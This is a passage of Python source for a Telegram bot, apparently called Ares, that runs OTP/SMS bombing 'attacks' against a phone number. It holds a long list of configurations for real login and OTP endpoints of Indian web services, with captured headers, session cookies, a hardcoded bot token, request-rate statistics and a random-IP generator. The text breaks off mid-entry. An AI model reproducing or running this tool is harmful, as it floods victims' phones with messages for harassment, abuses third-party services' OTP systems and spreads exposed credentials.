# ares_tg_bot_part1.py
import asyncio
import aiohttp
import time
import os
import sys
import json
import random
from datetime import datetime
from colorama import init, Fore, Style
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode
import logging

# Bot Configuration
BOT_TOKEN = "8352930080:AAHP6MfHWTh1jl23ijjElOhGYXO-xAzIyxA"
ADMIN_IDS = []  # Add admin user IDs here for restricted access

# Initialize colorama
init(autoreset=True)

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Global variables
active_attacks = {}  # attack_id -> attack_info
user_sessions = {}   # user_id -> session_data

# Performance optimization
try:
    import uvloop
    uvloop.install()
    logger.info("Using uvloop for maximum performance")
except ImportError:
    pass

class AttackInfo:
    """Class to store attack information"""
    def __init__(self, user_id, phone, attack_id):
        self.user_id = user_id
        self.phone = phone
        self.attack_id = attack_id
        self.start_time = time.time()
        self.running = True
        self.total_requests = 0
        self.successful_requests = 0
        self.real_otp_success = 0
        self.last_update = time.time()
        self.task = None
        
    def get_stats(self):
        elapsed = time.time() - self.start_time
        requests_per_second = self.total_requests / elapsed if elapsed > 0 else 0
        success_rate = (self.successful_requests / self.total_requests * 100) if self.total_requests > 0 else 0
        otp_rate = (self.real_otp_success / self.total_requests * 100) if self.total_requests > 0 else 0
        
        return {
            'elapsed': elapsed,
            'rps': requests_per_second,
            'success_rate': success_rate,
            'otp_rate': otp_rate,
            'total': self.total_requests,
            'success': self.successful_requests,
            'otps': self.real_otp_success
        }

async def make_api_call(session, url, method, headers, data=None):
    """Ultra-fast API call with response checking"""
    try:
        if method.upper() == "POST":
            async with session.post(url, headers=headers, data=data, timeout=1.2) as response:
                status = response.status
                try:
                    text = await response.text()
                    return status, text[:200]
                except:
                    return status, ""
        elif method.upper() == "GET":
            async with session.get(url, headers=headers, timeout=1.2) as response:
                status = response.status
                try:
                    text = await response.text()
                    return status, text[:200]
                except:
                    return status, ""
    except Exception as e:
        return None, str(e)
    return None, ""

def generate_ip():
    """Generate random IP address"""
    return f"{random.randint(100, 200)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
# ares_tg_bot_part2a.py - API_CONFIGS (First 12 APIs)
API_CONFIGS = [
    {
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "X-API-Client": "mobilesite",
            "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a",
            "X-Accept-Language": "en",
            "X-B3-TraceId": "991736185845136",
            "X-Country-Code": "IN",
            "X-Country-Code-Override": "IN",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            "Origin": "https://www.lenskart.com",
            "X-Requested-With": "pure.lite.browser",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.lenskart.com/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
        },
        "data": lambda phone: f'{{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.gopinkcabs.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.gopinkcabs.com/app/cab/customer/step1.php",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            "Cookie": "PHPSESSID=mor5basshemi72pl6d0bp21kso; mylocation=#"
        },
        "data": lambda phone: f"check_mobile_number=1&contact={phone}"
    },
    {
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.shemaroome.com",
            "Referer": "https://www.shemaroome.com/users/sign_in",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda phone: f"mobile_no=%2B91{phone}"
    },
    {
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "content-length": lambda data: str(len(data)),
            "sec-ch-ua-platform": "\"Android\"",
            "cache": "no-store",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "x-channel-id": "WEB",
            "sec-ch-ua-mobile": "?1",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
            "accept": "*/*",
            "origin": "https://www.kpnfresh.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.kpnfresh.com/",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "priority": "u=1, i"
        },
        "data": lambda phone: f'{{"phone_number":{{"number":"{phone}","country_code":"+91"}}}}'
    },
    {
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "x-app-version": "3.2.6",
            "x-user-journey-id": "faf3393a-018e-4fb9-8aed-8c9a90300b88",
            "content-type": "application/json; charset=UTF-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/5.0.0-alpha.11"
        },
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-encoding": "gzip",
            "host": "api.bikefixup.com",
            "client": "app",
            "content-type": "application/json; charset=UTF-8",
            "user-agent": "Dart/3.6 (dart:io)"
        },
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Deviceid": "5df83c463f0ff8ff",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)",
            "Accept-Language": "en-US",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country_code":"+91"}}'
    },
    {
        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "\"Android\"",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "content-type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "accept": "*/*",
            "origin": "https://stratzy.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://stratzy.in/login",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cookie": "_fbp=fb.1.1745073074472.847987893655824745; _ga=GA1.1.2022915250.1745073078; _ga_TDMEH7B1D5=GS1.1.1745073077.1.1.1745073132.5.0.0",
            "priority": "u=1, i"
        },
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "\"Android\"",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "content-type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "accept": "*/*",
            "origin": "https://stratzy.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-Dest": "empty",
            "referer": "https://stratzy.in/login",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cookie": "_fbp=fb.1.1745073074472.847987893655824745; _ga=GA1.1.2022915250.1745073078; _ga_TDMEH7B1D5=GS1.1.1745073077.1.1.1745073102.35.0.0",
            "priority": "u=1, i"
        },
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "\"Android\"",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "content-type": "application/json; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "origin": "https://wellacademy.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://wellacademy.in/store/",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cookie": "ci_session=9phtdg2os6f19dae6u8hkf3fnfthcu8e; _ga=GA1.1.229652925.1745073317; _ga_YCZKX9HKYC=GS1.1.1745073316.1.1.1745073316.0.0.0; _clck=rhb9ip%7C2%7Cfv7%7C0%7C1935; _clsk=kfjbpg%7C1745073319962%7C1%7C1%7Ch.clarity.ms%2Fcollect; cf_clearance=...; twk_idm_key=PjxT2Q-2-xzG4VIHJXn7V; twk_uuid_5f588625f0e7167d000eb093=%7B...%7D; TawkConnectionTime=0",
            "priority": "u=1, i"
        },
        "data": lambda phone: f'{{"contact_no":"{phone}"}}'
    },
    {
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "identifier": "home",
            "mlang": "en",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "alang": "en",
            "country_code": "IN",
            "vlang": "en",
            "origin": "https://www.hungama.com",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.hungama.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}}'
    },
    {
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
            "Host": "api.servetel.in",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        },
        "data": lambda phone: f"mobile_number={phone}"
    }
]
# ares_tg_bot_part2b.py - API_CONFIGS (Next 12 APIs)
API_CONFIGS.extend([
    {
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "Oauthtoken": "",
            "AppVersion": "245",
            "ApiVersion": "6.2.55",
            "DeviceType": "Android",
            "DeviceId": "44098bdebb2dc047",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "24",
            "Host": "merucabapp.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.9.0"
        },
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "\"Android\"",
            "changesorigin": "product-listingpage",
            "originid": "0",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "appname": "Website",
            "userid": "0",
            "origin": "https://www.beepkart.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.beepkart.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"city":362,"fullName":"","phone":"{phone}","source":"myaccount","location":"","leadSourceLang":"","platform":"","consent":false,"whatsappConsent":false,"blockNotification":false,"utmSource":"","utmCampaign":"","sessionInfo":{{"sessionInfo":{{"sessionId":"d25b5a3d-72b4-4cd7-b6cb-b926a70ca08b","userId":"0","sessionRawString":"pathname=/account/new-landing&source=myaccount","referrerUrl":"/app_login?pathname=/account/new-landing&source=myaccount"}},"deviceInfo":{{"deviceRawString":"cityId=362; screen=360x800; _gcl_au=1.1.771171092.1745234524; cityName=bangalore","device_token":"PjwHFhDUVgUGYrkW29b5lGdR0kTg4kaA","device_type":"Android"}}}}'
    },
    {
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {
            "Host": "lendingplate.com",
            "Connection": "keep-alive",
            "Content-Length": "45",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://lendingplate.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://lendingplate.com/personal-loan",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "Cookie": "_fbp=fb.1.1745235455885.251422456376518259; _gcl_au=1.1.241418330.1745235457; _gid=GA1.2.593762244.1745235461; PHPSESSID=ed051a5ea7783741eacfd602c6a192d3; _ga=GA1.1.1324264906.1745235460; _ga_MZBRRWYESB=GS1.1.1745235460.1.1.1745235474.46.0.0; moe_uuid=370f7dae-9313-4d44-8e38-efe54c437df8; _ga_KVRZ90DE3T=GS1.1.1745235460.1.1.1745235496.24.0.0"
        },
        "data": lambda phone: f"mobiles={phone}&resend=Resend&clickcount=3"
    },
    {
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "client-id": "snitch_secret",
            "Accept-Headers": "application/json",
            "Origin": "https://www.snitch.com",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.snitch.com/",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {
            "Content-Length": "61",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://ekyc.daycoindia.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm; _clsk=1oia3yt%7C1745236688928%7C3%7C1%7Cu.clarity.ms%2Fcollect",
            "Priority": "u=1, i"
        },
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
    },
    {
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1"
        },
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "origin": "https://otpless.com",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://otpless.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"loginUri":"https://otpless.com/appid/0BMO1A04TAKEKDFR46DA?sdkPlatform=SHOPIFY&redirect_uri=https://imagineonline.store/account/login","origin":"https://otpless.com","deviceInfo":"{{\\"userAgent\\":\\"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36\\",\\"platform\\":\\"Linux armv81\\",\\"vendor\\":\\"Google Inc.\\",\\"browser\\":\\"Chrome\\",\\"connection\\":\\"4g\\",\\"language\\":\\"en-IN\\",\\"cookieEnabled\\":true,\\"screenWidth\\":360,\\"screenHeight\\":800,\\"screenColorDepth\\":24,\\"devicePixelRatio\\":3,\\"timezoneOffset\\":-330,\\"cpuArchitecture\\":\\"8-core\\",\\"fontFamily\\":\\"\\\\\\"Times New Roman\\\\\\"\\",\\"cHash\\":\\"82c029dd209dc895ed5cdbe212c5d67a50d3aadc918ecd24a3d06744b2e8e1f1\\"}}","browser":"Chrome","sdkPlatform":"SHOPIFY","platform":"Android","isLoginPage":true,"fingerprintJs":"{{\\"visitorId\\":\\"3bd3e9c36b55052f8c6aa470a1b7f1f7\\",\\"version\\":\\"4.6.1\\",\\"confidence\\":{{\\"score\\":0.4,\\"comment\\":\\"0.994 if upgrade to Pro: https://fpjs.dev/pro\\"}}}}","channel":"OTP","silentAuthEnabled":false,"triggerWebauthn":true,"mobile":"{phone}","value":"7029364131","selectedCountryCode":"+91","recaptchaToken":"YourRecaptchaTokenHere"}}'
    },
    {
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "Android",
            "viewport-width": "360",
            "ect": "4g",
            "device-memory": "8",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "dpr": "3",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.myimaginestore.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.myimaginestore.com/?srsltid=AfmBOorMjDyyPK614cwQ_BYW58QCQwqGy2z3CU1dNnWF-NnvMwFcpOgA",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "Cookie": "PHPSESSID=8trla61rg1ong40jfipnbkgbo2; searchReport-log=0; n7HDToken=d+IZAKbE68OGf8+MM3jp90Mh6Q7BsnSBnMQErzL+ViPGD2mROvGr8S/f/qo7gEEdKNx/7TbxOIKo/VLu3jyj1plDFiAxE5Gc3j24XaWSb7MUbgXOEq+MYK8gnkV3fuQb9nQEzNtrCfWu17tUGSJnbWaPF4OVHNTvPbpwT5KFt1Y=; _fbp=fb.1.1745237999949.310699470488280662; _gcl_au=1.1.1379491012.1745238000; form_key=BGrEvqqhl0ydIR8q; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; _ga=GA1.2.1310867166.1745238001; _gid=GA1.2.1539797096.1745238002; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; twk_idm_key=2gFbbj1GW6XCnip5ilOxx; TawkConnectionTime=0; _ga_GQ7J3T0PJB=GS1.1.1745238000.1.1.1745238019.41.0.0; private_content_version=e5dc03e8bc555ce39375a87c1f3e5089; section_data_ids=%7B%22cart%22%3A1745238010%2C%22customer%22%3A1745238010%2C%22compare-products%22%3A1745238010%2C%22last-ordered-items%22%3A1745238010%2C%22directory-data%22%3A1745238010%2C%22captcha%22%3A1745238010%2C%22instant-purchase%22%3A1745238010%2C%22loggedAsCustomer%22%3A1745238010%2C%22persistent%22%3A1745238010%2C%22review%22%3A1745238010%2C%22wishlist%22%3A1745238010%2C%22ammessages%22%3A1745238010%2C%22bss-fbpixel-atc%22%3A1745238010%2C%22bss-fbpixel-subscribe%22%3A1745238010%2C%22chatData%22%3A1745238010%2C%22recently_viewed_product%22%3A1745238010%2C%22recently_compared_product%22%3A1745238010%2C%22product_data_storage%22%3A1745238010%7D"
        },
        "data": lambda phone: f"mobile={phone}"
    },
    {
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/x-www-form-urlencoded",
            "sec-ch-ua-platform": "Android",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=2a1cf434a30d4d3189d50a0751921996",
            "sentry-trace": "2a1cf434a30d4d3189d50a0751921996-9a2517ad5ff86454",
            "origin": "https://www.nobroker.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.nobroker.in/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Cookie": "cloudfront-viewer-address=2001%3A4860%3A7%3A508%3A%3Aef%3A33486; cloudfront-viewer-country=MY; cloudfront-viewer-latitude=2.50000; cloudfront-viewer-longitude=112.50000; headerFalse=false; isMobile=true; deviceType=android; js_enabled=true; nbcr=bangalore; nbpt=RENT; nbSource=www.google.com; nbMedium=organic; nbCampaign=https%3A%2F%2Fwww.google.com%2F; nb_swagger=%7B%22app_install_banner%22%3A%22bannerB%22%7D; _gcl_au=1.1.1907920311.1745238224; _gid=GA1.2.1607866815.1745238224; _ga=GA1.2.777875435.1745238224; nbAppBanner=close; cto_bundle=jK9TOl9FUzhIa2t2MUElMkIzSW1pJTJCVnBOMXJyNkRSSTlkRzZvQUU0MEpzRXdEbU5ySkI0NkJOZmUlMkZyZUtmcjU5d214YkpCMTZQdTJDb1I2cWVEN2FnbWhIbU9oY09xYnVtc2VhV2J0JTJCWiUyQjl2clpMRGpQaVFoRWREUzdyejJTdlZKOEhFZ2Zmb2JXRFRyakJQVmRNaFp2OG5YVHFnJTNEJTNE; _fbp=fb.1.1745238225639.985270044964203739; moe_uuid=901076a7-33b8-42a8-a897-2ef3cde39273; _ga_BS11V183V6=GS1.1.1745238224.1.1.1745238241.0.0.0; _ga_STLR7BLZQN=GS1.1.1745238224.1.1.1745238241.0.0.0; mbTrackID=b9cc4f8434124733b01c392af03e9a51; nbDevice=mobile; nbccc=21c801923a9a4d239d7a05bc58fcbc57; JSESSION=5056e202-0da2-4ce9-8789-d4fe791a551c; _gat_UA-46762303-1=1; _ga_SQ9H8YK20V=GS1.1.1745238224.1.1.1745238326.18.0.1658024385"
        },
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },
    {
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/x-www-form-urlencoded",
            "sec-ch-ua-platform": "Android",
            "x-requested-with": "XMLHttpRequest",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "origin": "https://www.cossouq.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.cossouq.com/?srsltid=AfmBOoqQ0GRbpH-mXrUJ5b6tAC5W6ZyAzFJRI7l0mbnNQ9i5LMpAIvh1",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
